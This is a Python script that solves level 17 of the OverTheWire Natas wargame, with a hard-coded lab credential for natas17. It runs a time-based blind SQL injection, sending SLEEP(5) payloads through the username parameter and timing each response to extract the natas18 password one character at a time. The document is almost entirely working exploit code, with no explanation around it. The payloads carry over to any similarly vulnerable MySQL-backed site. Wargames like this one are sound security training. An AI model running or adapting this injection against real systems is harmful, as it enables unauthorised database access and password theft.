import requests
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# characters used in Natas passwords (0-9, a-z, A-Z)
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password = ""

print("[*] Extracting natas18 password...")

for position in range(1, 33):
    for char in chars:
        test_guess = password + char
        
        payload = f"natas18\" AND IF(password LIKE BINARY '{password+char}%', SLEEP(5), 0) -- "
        # alternative: payload = f"natas18\" AND IF(SUBSTRING(password, {position}, 1) LIKE BINARY '{char}', SLEEP(5), 0) -- " 
        # payload = f"natas18\" AND IF( (1=1), SLEEP(3), 0) -- " #verifying if SLEEP condition works

        # send POST/GET request depending on Natas 17 form (usually GET or POST via "username" parameter)
        response = requests.get(url, auth=auth, params={"username": payload, "debug": "1"})
        response_time = response.elapsed.total_seconds()

        print(f"Character '{char}' pos {position}: time = {response_time:.2f} seconds")

        # logic for checking a threshold, if response_time > 5, found correct char in password
        if response_time > 5.0:
            print("Threshold exceeded (Delayed response)")
            password += char
            print(f"[+] Character {position}: {password}")
            break
        #else:
            #print("Normal response time")

print(f"\n[!] Final Password: {password}")